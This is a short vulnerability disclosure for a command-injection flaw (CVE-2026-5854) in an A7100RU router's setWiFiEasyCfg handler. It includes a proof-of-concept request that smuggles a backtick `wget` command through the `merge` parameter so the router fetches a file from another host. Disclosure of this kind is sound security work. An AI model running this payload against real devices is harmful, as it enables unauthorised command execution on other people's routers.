# A7100RU Vulnerability（CVE-2026-5854）
...
In  sub_424868 function, it reads in a user-provided parameter `merge` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `merge` as **\`wget 192.168.6.1:6666/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setWiFiEasyCfg","merge":"`wget 192.168.6.1:7777/testpoc`"
